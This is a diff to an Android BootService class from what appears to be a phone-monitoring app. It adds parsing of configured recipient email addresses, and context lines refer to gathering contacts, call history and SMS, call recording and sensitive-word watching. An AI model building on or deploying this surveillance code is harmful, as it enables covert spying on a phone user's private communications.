@@ -14,6 +14,7 @@ import com.android.internal.telephony.ITelephony;
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.RegExpUtil;
+import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
 import android.app.Service;
@@ -51,6 +52,8 @@ public class BootService extends Service
 	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder;
 	
+	// Global variables that will be initialized when phone starts
+	public static String[] recipients = null;
 	public static String[] sensitiveWordArray = null;
 	
 	static {
@@ -188,7 +191,9 @@ public class BootService extends Service
 		// Start timer to get contacts, phone call history and SMS
 		if (ConfigCtrl.isLegal(context)) 
 		{
-			// Get global varaibles
+			// ------------------------------------------------------------------
+			// Initialize global variables
+			recipients = getRecipients(context);
 			sensitiveWordArray = GlobalPrefActivity.getSensitiveWordsArray(context);
 			
 			// ------------------------------------------------------------------			
@@ -300,5 +305,16 @@ public class BootService extends Service
 			
 		return false;
 	} 
+	
+	private static String[] getRecipients(Context context)
+	{
+		String mail = GlobalPrefActivity.getReceiverMail(context);
+		String[] mails = mail.split(",");
+		if (mails.length > 0) {
+			return StrUtils.filterMails(mails);
+		} else {
+			return null;
+		}
+	}
 	
 }
